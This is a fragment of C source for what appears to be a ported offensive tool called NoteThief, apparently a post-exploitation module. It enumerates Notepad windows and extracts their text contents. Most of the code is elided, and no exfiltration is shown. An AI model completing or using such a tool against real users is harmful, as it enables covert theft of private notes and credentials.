...
/* =========================================================================
 * ported by Xpatr0nX
 * original source: https://github.com/trainr3kt/NoteThief
 * ========================================================================= */
...
static BOOL extract_notepad_content(WCHAR **dispatch, HWND hwndNotepad, char *outputBuffer, size_t bufferSize, int *tabsFound) {
...
void coffee(char **argv, int argc, WCHAR **dispatch) {
    ...
    if (argc > 1) {
        titleArg = argv[1]; // argv[0] is the command name, argv[1] is the first arg
    ...
    for (i = 0; i < enumData.count; i++) {
        ...
        success = extract_notepad_content(dispatch, hwnd, contentBuffer, MAX_NOTEPAD_BUFFER, &tabsFound);
        if (!success) {
